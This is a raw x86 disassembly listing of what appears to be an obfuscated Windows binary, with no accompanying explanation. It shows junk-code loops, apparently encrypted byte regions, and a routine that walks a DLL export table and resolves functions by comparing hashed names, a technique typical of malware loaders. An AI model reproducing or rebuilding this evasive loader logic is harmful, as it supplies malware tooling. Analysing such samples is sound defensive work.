  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [ebx],ebp
  40d123:	fiadd  WORD PTR [esi+0x7e81f9c9]
  40d129:	jle    0x40d14d
  40d12b:	jg     0x40d1ab
  40d12d:	jle    0x40d0f6
  40d12f:	jbe    0x40d100
  40d131:	nop
  40d132:	xor    ebp,esp
  40d134:	sbb    edi,DWORD PTR ds:0xe977e22f
  40d13a:	test   eax,0x5c39119f
  40d13f:	cmp    ebp,ecx
  40d141:	call   0xe9c0:0x35efa9cc
  40d148:	pushf  
  40d149:	cmp    DWORD PTR [ecx+0x37ff2a7d],ebx
  40d14f:	inc    edi
  40d150:	in     eax,0x46
  40d152:	xchg   DWORD PTR [eax],edx
  40d154:	cmp    al,0x2e
  40d156:	test   DWORD PTR [ebx+0x6c],ebx
  40d159:	dec    BYTE PTR [edx+0x43]
  40d15c:	mov    ebp,0xcd8461a9
  40d161:	repnz rcr DWORD PTR [ebp+0x6a],1
  40d165:	inc    esp
  40d166:	adc    al,0x46
  40d168:	xchg   ebp,eax
  40d169:	jle    0x40d1d2
  40d16b:	adc    ebp,DWORD PTR [edi]
  40d16d:	enter  0x8502,0xfe
  40d171:	dec    eax
  40d172:	pop    edx
  40d173:	cmp    al,0xdb
  40d176:	aam    0x9a
  40d178:	(bad)  
  40d179:	xchg   edi,eax
  40d17a:	les    esi,FWORD PTR [ebx+0x52]
  40d17d:	pop    DWORD PTR [eax+0x5a031523]
  40d183:	cdq    
  40d184:	push   0x27602c83
  40d189:	xor    eax,DWORD PTR [eax]
  40d18b:	and    BYTE PTR [esi+0x34],ch
  40d18e:	sub    al,0xe6
  40d190:	and    al,bh
  40d192:	push   ss
  40d193:	repz jb 0xeefd9883
  40d19a:	das    
  40d19b:	mov    dl,0x3
  40d19d:	lods   eax,DWORD PTR ds:[esi]
  40d19e:	in     eax,dx
  40d19f:	ds jnp 0x40d170
  40d1a2:	cdq    
  40d1a3:	out    0x2b,eax
  40d1a5:	lods   eax,DWORD PTR ds:[esi]
  40d1a6:	xor    ebp,esi
  40d1a8:	cli    
  40d1a9:	push   esp
  40d1aa:	enter  0xe638,0xbb
  40d1ae:	ret    0x8a2c
  40d1b1:	xlat   BYTE PTR ds:[ebx]
  40d1b2:	imul   esi,edx,0x6bdb3ff5
  40d1b8:	mov    eax,ecx
  40d1ba:	mov    DWORD PTR [ecx+eiz*2],0x682212e0
  40d1c1:	ret    0xb819
  40d1c4:	push   ebx
  40d1c5:	test   al,0x21
  40d1c7:	ins    DWORD PTR es:[edi],dx
  40d1c8:	fs xor al,0x16
  40d1cb:	dec    edi
  40d1cc:	sub    al,0xdb
  40d1ce:	in     eax,0x8b
  40d1d0:	mov    BYTE PTR [eax+ecx*1-0x2b],ch
  40d1d4:	gs jnp 0x40d196
  40d1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1d8:	jnp    0x40d1c0
  40d1da:	adc    eax,0x5dfe346
  40d1df:	add    DWORD PTR [esi+0x60],edi
  40d1e2:	icebp  
  40d1e3:	push   ebx
  40d1e4:	lods   al,BYTE PTR ds:[esi]
  40d1e5:	lds    ebp,FWORD PTR ds:[esi]
  40d1e8:	dec    esi
  40d1e9:	pop    eax
  40d1ea:	xchg   edi,eax
  40d1eb:	pand   mm1,mm0
  40d1ee:	push   edi
  40d1ef:	(bad)  
  40d1f0:	mov    eax,0xe3ab6d3d
  40d1f5:	out    0xa,eax
  40d1f7:	jecxz  0x40d242
  40d1f9:	clc    
  40d1fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1fb:	add    ebx,DWORD PTR [ebx-0x4f]
  40d1fe:	cdq    
  40d1ff:	mov    esp,DWORD PTR [ebx-0x3a]
  40d202:	jp     0x40d197
  40d204:	mov    DWORD PTR [edi],ecx
  40d206:	push   eax
  40d207:	xchg   esp,eax
  40d208:	push   ecx
  40d209:	retf   0x4f37
  40d20c:	iret   
  40d20d:	iret   
  40d20e:	loopne 0x40d1f8
  40d210:	lahf   
  40d211:	stos   BYTE PTR es:[edi],al
  40d212:	push   es
  40d213:	bound  esp,QWORD PTR [ecx+0x120d2f63]
  40d219:	mov    edi,0xd57fc9e0
  40d21e:	jmp    0x991301a1
  40d223:	mov    eax,fs:0x73741c81
  40d229:	pushf  
  40d22a:	sub    ebp,ecx
  40d22c:	or     cl,dl
  40d22e:	dec    ebx
  40d22f:	pusha  
  40d230:	das    
  40d231:	sub    bh,BYTE PTR [eax]
  40d233:	cdq    
  40d234:	sub    dl,BYTE PTR [esi+0x2eb0fbaa]
  40d23a:	pushf  
  40d23b:	sbb    esi,DWORD PTR [ebx]
  40d23d:	xchg   edx,eax
  40d23e:	add    eax,0xdb22d3a0
  40d243:	jp     0x40d1c8
  40d245:	scas   al,BYTE PTR es:[edi]
  40d246:	in     al,dx
  40d247:	das    
  40d248:	ror    BYTE PTR [ebx],cl
  40d24a:	jle    0x40d2a8
  40d24c:	dec    esp
  40d24d:	shl    esi,0x9f
  40d250:	and    al,0x22
  40d252:	push   ds
  40d253:	out    dx,eax
  40d254:	mov    ebp,0x9f5eef1c
  40d259:	xchg   BYTE PTR [ebx],al
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xb36a8e30
  40d410:	rcl    BYTE PTR [edi+0x2e],0xad
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3df
  40d41c:	dec    eax
  40d41d:	jb     0x40d436
  40d41f:	ins    BYTE PTR es:[edi],dx
  40d420:	dec    ecx
  40d421:	jle    0x40d44c
  40d423:	nop
  40d424:	cmp    ecx,ebx
  40d426:	repz aad 0x84
  40d429:	aad    0x9c
  40d42b:	pop    eax
  40d42c:	stos   BYTE PTR es:[edi],al
  40d42d:	and    BYTE PTR [esi-0x39],dh
  40d430:	push   ss
  40d431:	inc    ecx
  40d432:	es mov ebp,0xe0ecde0
  40d438:	dec    ecx
  40d439:	add    eax,esi
  40d43b:	scas   al,BYTE PTR es:[edi]
  40d43c:	loope  0x40d4ab
  40d43e:	mov    eax,ds:0x876c46d1
  40d443:	jne    0x40d46f
  40d445:	or     DWORD PTR [ecx+0x306906d6],edx
  40d44b:	imul   esi,esi,0x5653c889
  40d451:	pop    edi
  40d452:	sar    BYTE PTR [edi+ecx*2+0x39cdba86],0xef
  40d45a:	mov    DWORD PTR [eax+0x6d],edi
  40d45d:	jo     0x40d41b
  40d45f:	cdq    
  40d460:	loop   0x40d3fb
  40d462:	mov    edx,0x9e74770e
  40d467:	sub    edi,ecx
  40d469:	test   DWORD PTR ss:[edx],edx
  40d46c:	jnp    0x40d412
  40d46e:	cli    
  40d46f:	mov    al,0x5f
  40d471:	adc    BYTE PTR [ebx],al
  40d473:	test   dh,0x42
  40d476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d477:	push   ebp
  40d478:	jge    0x40d4f3
  40d47a:	pop    ecx
  40d47b:	aam    0xf7
  40d47d:	(bad)  
  40d47e:	sbb    cl,dl
  40d480:	xchg   DWORD PTR [esi+0x20],edx
  40d483:	js     0x40d47f
  40d485:	test   BYTE PTR [ecx+0x934f2be],ah
  40d48b:	and    ecx,DWORD PTR [edx-0x6ba7a5ad]
  40d491:	mov    esp,0x3087fab2
  40d496:	dec    eax
  40d497:	cmp    al,BYTE PTR [ebp+0x4e]
  40d49a:	pop    eax
  40d49b:	xchg   DWORD PTR [eax+0x1a],edx
  40d49e:	pop    ss
  40d49f:	pop    ds
  40d4a0:	jne    0x40d427
  40d4a2:	sahf   
  40d4a3:	enter  0x5339,0xe6
  40d4a7:	inc    esp
  40d4a8:	pop    ecx
  40d4a9:	dec    esp
  40d4aa:	xlat   BYTE PTR ds:[ebx]
  40d4ab:	mov    eax,0xfe05a3d6
  40d4b0:	mov    ch,0xf1
  40d4b2:	jp     0x40d508
  40d4b4:	inc    eax
  40d4b5:	into   
  40d4b6:	xchg   edi,eax
  40d4b7:	test   BYTE PTR [esi+0x2],0x97
  40d4bb:	loope  0x40d4ef
  40d4bd:	xchg   ebx,eax
  40d4be:	push   ds
  40d4bf:	dec    edx
  40d4c0:	les    eax,FWORD PTR [ecx-0x73]
  40d4c3:	jl     0x40d506
  40d4c5:	pushf  
  40d4c6:	repnz lea ebp,[ecx+0x48]
  40d4ca:	mov    eax,0x5e2ec17b
  40d4cf:	inc    esp
  40d4d0:	sbb    eax,esp
  40d4d2:	aad    0x7b
  40d4d4:	shr    esi,0x80
  40d4d7:	pop    esi
  40d4d8:	mov    al,ds:0xb0085a68
  40d4dd:	and    eax,0xee43a631
  40d4e2:	inc    eax
  40d4e3:	jle    0x40d501
  40d4e5:	(bad)  
  40d4e6:	call   0xd736da7
  40d4eb:	pop    ecx
  40d4ec:	loope  0x40d50c
  40d4ee:	inc    ebp
  40d4ef:	push   edx
  40d4f0:	fwait
  40d4f1:	clc    
  40d4f2:	and    al,dl
  40d4f4:	cmp    BYTE PTR [ebx],dh
  40d4f6:	call   0xb57b:0x8a3f2358
  40d4fd:	loopne 0x40d54b
  40d4ff:	mov    ds:0xeec68e87,al
  40d504:	push   esp
  40d505:	int    0xee
  40d507:	shl    BYTE PTR [eax-0x31],0x64
  40d50b:	nop
  40d50c:	test   BYTE PTR [esp+edi*4],0x54
  40d510:	mov    edx,0x92806b4
  40d515:	sti    
  40d516:	sbb    al,0xd0
  40d518:	jns    0x40d4c3
  40d51a:	retf   0x7f1e
  40d51d:	inc    esi
  40d51e:	sahf   
  40d51f:	mov    es,WORD PTR [ebp+0x70]
  40d522:	jg     0x40d578
  40d524:	mov    edi,0x992fe2cb
  40d529:	xor    edx,eax
  40d52b:	push   ebp
  40d52c:	call   0x6b291c9c
  40d531:	jnp    0x40d5aa
  40d533:	xor    al,0x2
  40d535:	lds    ebx,FWORD PTR [edi+0x35]
  40d538:	mov    ds:0x587cb736,eax
  40d53d:	xchg   ebp,eax
  40d53e:	and    BYTE PTR [eax-0x6d4475d3],bh
  40d544:	out    dx,eax
  40d545:	push   edx
  40d546:	adc    eax,0xe80c75ff
  40d54b:	sbb    DWORD PTR [ecx-0x1],ebx
  40d54e:	dec    DWORD PTR [ebx+0x4d8bfc45]
  40d554:	clc    
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	stos   BYTE PTR es:[edi],al
  40d5b8:	jae    0x40d5b7
  40d5ba:	and    edx,DWORD PTR [ecx-0x71]
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5d6
  40d5c4:	nop
  40d5c5:	jno    0x40d59d
  40d5c7:	fidiv  DWORD PTR [edx]
  40d5c9:	mov    al,ds:0xf242f83b
  40d5ce:	mov    edi,0x311664b2
  40d5d3:	test   DWORD PTR [edi],0x387c2bcf
  40d5d9:	inc    esp
  40d5da:	das    
  40d5db:	sbb    BYTE PTR [ebp-0xf],bl
  40d5de:	outs   dx,DWORD PTR ds:[esi]
  40d5df:	mov    ah,0x28
  40d5e1:	pop    ecx
  40d5e2:	repz loope 0x40d5d8
  40d5e5:	mov    ds:0x6c4414f8,al
  40d5ea:	push   cs
  40d5eb:	mov    ds:0x29cc9ad1,eax
  40d5f0:	sub    al,0xf7
  40d5f2:	adc    ebx,0x4e12b6d2
  40d5f8:	xchg   edi,eax
  40d5f9:	nop
  40d5fa:	or     ebx,esp
  40d5fc:	push   edx
  40d5fd:	sbb    al,0x2d
  40d5ff:	push   ds
  40d600:	and    eax,0xbac29812
  40d605:	test   al,0x3b
  40d607:	xchg   DWORD PTR [ebp-0x28392cd4],ebp
  40d60d:	in     eax,dx
  40d60e:	pushf  
  40d60f:	add    ch,BYTE PTR [eax+0x62]
  40d612:	lods   eax,DWORD PTR ds:[esi]
  40d613:	mov    ecx,0xe67c8a64
  40d618:	adc    DWORD PTR [ecx],eax
  40d61a:	adc    eax,DWORD PTR [edi]
  40d61c:	mov    ch,0xd0
  40d61e:	mov    bh,0xbf
  40d620:	cs add ebx,esi
  40d623:	jecxz  0x40d64e
  40d625:	mov    al,ds:0x426a8883
  40d62a:	cmp    BYTE PTR cs:[esi],bh
  40d62d:	sbb    esi,eax
  40d62f:	shl    DWORD PTR [edx-0x19],cl
  40d632:	xor    al,0xf3
  40d634:	mov    eax,ds:0xc8c9d4fc
  40d639:	pop    edi
  40d63a:	add    DWORD PTR [esi+0x3b],edi
  40d63d:	iret   
  40d63e:	lock popa 
  40d640:	ds mov al,0x33
  40d643:	lahf   
  40d644:	push   esi
  40d645:	int3   
  40d646:	je     0x40d651
  40d648:	shl    BYTE PTR [eax-0x544b9ab5],1
  40d64e:	(bad)  
  40d64f:	jmp    0x82503d5c
  40d654:	adc    al,0xfb
  40d656:	pop    es
  40d657:	aam    0x81
  40d659:	dec    ebp
  40d65a:	pushf  
  40d65b:	sub    al,0xdb
  40d65d:	cmp    bh,BYTE PTR [esp+ecx*8-0x67c436e3]
  40d664:	mov    esp,0x96bc3e6b
  40d669:	fs jmp 0x40d623
  40d66c:	pushf  
  40d66d:	xchg   DWORD PTR [ebp+ebx*4+0x4d],eax
  40d671:	jmp    0x6cd483af
  40d676:	mov    ecx,0x2f974e14
  40d67b:	push   edx
  40d67c:	xlat   BYTE PTR ds:[ebx]
  40d67d:	popf   
  40d67e:	popa   
  40d67f:	test   al,0x84
  40d681:	dec    esi
  40d682:	jp     0x40d699
  40d684:	clc    
  40d685:	add    al,0xfc
  40d687:	or     al,BYTE PTR [esi-0x54]
  40d68a:	repz xchg edx,eax
  40d68c:	jbe    0x40d64e
  40d68e:	mov    ds:0x879604a7,eax
  40d693:	lods   eax,DWORD PTR ds:[esi]
  40d694:	jge    0x40d6e5
  40d696:	xchg   edx,eax
  40d697:	mov    edi,0x1a3681a
  40d69c:	(bad)  
  40d69d:	jae    0x40d61f
  40d69f:	bnd je 0x40d721
  40d6a2:	imul   esi,DWORD PTR [edi-0x70],0x34
  40d6a6:	fiadd  DWORD PTR [edi-0x34]
  40d6a9:	adc    DWORD PTR [edx-0x53a32a37],esi
  40d6af:	outs   dx,BYTE PTR ds:[esi]
  40d6b0:	mov    edx,0x82b006af
  40d6b5:	inc    edx
  40d6b6:	adc    DWORD PTR [edx+0x7],eax
  40d6b9:	ds mov ebx,0xfbc20bce
  40d6bf:	dec    ebp
  40d6c0:	pop    esi
  40d6c1:	pop    ss
  40d6c2:	popf   
  40d6c3:	aam    0xbb
  40d6c5:	jns    0x40d716
  40d6c7:	sbb    edx,DWORD PTR [edi+edx*2+0x7f9a435c]
  40d6ce:	leavew 
  40d6d0:	xor    bl,BYTE PTR [eax+eax*1-0x5c]
  40d6d4:	sbb    eax,0xc2a58fcb
  40d6d9:	inc    si
  40d6db:	dec    ebx
